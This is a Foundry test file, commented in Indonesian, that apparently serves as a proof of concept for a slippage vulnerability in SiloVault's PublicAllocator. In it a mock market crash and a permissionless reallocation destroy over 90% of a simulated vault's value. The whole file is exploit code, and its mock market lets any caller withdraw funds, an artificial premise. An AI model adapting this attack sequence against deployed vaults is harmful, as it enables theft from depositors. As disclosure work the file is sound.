// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import "openzeppelin5/token/ERC20/ERC20.sol";
import "openzeppelin5/token/ERC20/extensions/ERC4626.sol";

// MENGIMPOR KONTRAK ASLI
import {SiloVault} from "../../contracts/SiloVault.sol";
import {PublicAllocator, FlowCapsConfig, FlowCaps, Withdrawal} from "../../contracts/PublicAllocator.sol";
import {ISiloVault, MarketAllocation} from "../../contracts/interfaces/ISiloVault.sol";
import {IVaultIncentivesModule} from "../../contracts/interfaces/IVaultIncentivesModule.sol";

// 1. Mock ERC20 Token (Mock USDC)
contract MockUSDC is ERC20 {
    constructor() ERC20("Mock USDC", "USDC") {}
    function mint(address to, uint256 amount) external { _mint(to, amount); }
}

// 2. Manipulatable Market (Mensimulasikan Market AMM)
contract ManipulatableMarket is ERC4626 {
    constructor(IERC20 asset) ERC20("Market Shares", "mUSDC") ERC4626(asset) {}

    function simulateFlashLoanCrash(uint256 stolenAmount) external {
        IERC20(asset()).transfer(msg.sender, stolenAmount);
    }

    function restoreFlashLoan(uint256 returnedAmount) external {
        IERC20(asset()).transferFrom(msg.sender, address(this), returnedAmount);
    }
}

// ============================================================================
// THE ZERO-DAY EXPLOIT TEST
// ============================================================================

contract SiloVaultZeroDayExploit is Test {
    MockUSDC usdc;
    ManipulatableMarket targetMarket;
    ManipulatableMarket idleMarket;
    
    SiloVault vault; 
    PublicAllocator allocator; 

    address admin = address(0x111);
    address attacker = address(0xBAD);

    function setUp() public {
        usdc = new MockUSDC();
        targetMarket = new ManipulatableMarket(usdc);
        idleMarket = new ManipulatableMarket(usdc);

        // MOCK INCENTIVES MODULE
        address mockIncentives = address(0x999);
        vm.mockCall(mockIncentives, abi.encodeWithSignature("getNotificationReceivers()"), abi.encode(new address[](0)));
        vm.mockCall(mockIncentives, abi.encodeWithSignature("getAllIncentivesClaimingLogics()"), abi.encode(new address[](0)));

        // DEPLOY KONTRAK ASLI
        vault = new SiloVault(admin, 86400, IVaultIncentivesModule(mockIncentives), address(usdc), "Silo Vault", "sUSDC");
        allocator = new PublicAllocator();

        // SET UP PERIZINAN
        vm.startPrank(admin);
        vault.setIsAllocator(address(allocator), true);
        allocator.setAdmin(ISiloVault(address(vault)), admin); 

        // 1. DAFTARKAN MARKET (Akan masuk status Pending karena Timelock)
        vault.submitCap(IERC4626(address(targetMarket)), type(uint184).max);
        vault.submitCap(IERC4626(address(idleMarket)), type(uint184).max);

        // 2. FAST-FORWARD WAKTU 1 HARI (86400 detik)
        vm.warp(block.timestamp + 86400);

        // 3. TERIMA MARKET (Sekarang Market resmi aktif/enabled)
        vault.acceptCap(IERC4626(address(targetMarket)));
        vault.acceptCap(IERC4626(address(idleMarket)));

        // 4. ATUR FLOW CAPS (Sekarang berhasil karena market sudah aktif)
        FlowCapsConfig[] memory configs = new FlowCapsConfig[](1);
        configs[0] = FlowCapsConfig({
            market: IERC4626(address(targetMarket)),
            caps: FlowCaps({maxIn: type(uint127).max, maxOut: 10_000 * 1e6})
        });
        allocator.setFlowCaps(ISiloVault(address(vault)), configs);

        // 5. ATUR ANTREAN SUPLAI
        IERC4626[] memory queue = new IERC4626[](2);
        queue[0] = IERC4626(address(targetMarket));
        queue[1] = IERC4626(address(idleMarket));
        vault.setSupplyQueue(queue);
        vm.stopPrank();

        // SETUP KONDISI NORMAL (Korban mendepositkan 1 Juta USDC)
        uint256 initialDeposit = 1_000_000 * 1e6;
        usdc.mint(address(this), initialDeposit);
        usdc.approve(address(vault), initialDeposit);
        vault.deposit(initialDeposit, address(this));

        // Admin mengalokasikan 100% dana Vault ke targetMarket
        MarketAllocation[] memory allocations = new MarketAllocation[](2);
        allocations[0] = MarketAllocation({market: IERC4626(address(targetMarket)), assets: type(uint256).max});
        allocations[1] = MarketAllocation({market: IERC4626(address(idleMarket)), assets: 0});
        
        vm.prank(admin);
        vault.setIsAllocator(address(this), true); 
        vault.reallocate(allocations);
    }

    function test_RealSiloVault_SlippageExploit() public {
        console.log("=== BEFORE EXPLOIT ===");
        uint256 vaultSharesBefore = targetMarket.balanceOf(address(vault));
        console.log("Vault Shares in Market :", vaultSharesBefore / 1e6);
        console.log("Vault Value (Assets)   :", targetMarket.convertToAssets(vaultSharesBefore) / 1e6);

        // ========================================================
        // EKSEKUSI SERANGAN OLEH ATTACKER
        // ========================================================
        vm.startPrank(attacker);
        usdc.mint(attacker, 100_000 * 1e6); // Modal flash loan / buffer

        // LANGKAH 1: Flash Loan Manipulation (Hancurkan harga market)
        uint256 stolenAmount = (usdc.balanceOf(address(targetMarket)) * 99) / 100;
        targetMarket.simulateFlashLoanCrash(stolenAmount);

        console.log("\n[*] Attacker crashes market exchange rate via Flash Loan...");
        console.log("[*] Vault's 1M Shares is now temporarily worth:", targetMarket.convertToAssets(vaultSharesBefore) / 1e6);

        // LANGKAH 2: Trigger Celah PublicAllocator (Permissionless)
        console.log("[*] Attacker calls PublicAllocator to withdraw 10,000 assets...");
        Withdrawal[] memory withdrawals = new Withdrawal[](1);
        withdrawals[0] = Withdrawal({
            market: IERC4626(address(targetMarket)), // EXPLICIT CASTING
            amount: uint128(10_000 * 1e6)
        });

        // BUG EKSEKUSI: Vault akan membakar semua shares karena tidak ada proteksi slippage!
        allocator.reallocateTo(ISiloVault(address(vault)), withdrawals, IERC4626(address(idleMarket)));

        // LANGKAH 3: Restore Market (Selesai Flash Loan)
        usdc.approve(address(targetMarket), stolenAmount);
        targetMarket.restoreFlashLoan(stolenAmount);
        vm.stopPrank();

        // ========================================================
        // VALIDASI DAMPAK (POST-ATTACK)
        // ========================================================
        console.log("\n=== AFTER EXPLOIT (IMPACT) ===");
        uint256 vaultSharesAfter = targetMarket.balanceOf(address(vault));
        uint256 vaultValueAfter = targetMarket.convertToAssets(vaultSharesAfter);

        console.log("Vault Shares in Market :", vaultSharesAfter / 1e6);
        console.log("Vault Value (Assets)   :", vaultValueAfter / 1e6);

        uint256 loss = (1_000_000 * 1e6) - vaultValueAfter;
        console.log("\n[!!!] VAULT NET LOSS   :", loss / 1e6, "USDC");

        // BUKTI TELAK: Vault kehilangan >90% TVL-nya karena eksploitasi ini.
        assertTrue(loss > 900_000 * 1e6, "Exploit failed: Vault did not suffer slippage");
    }
}
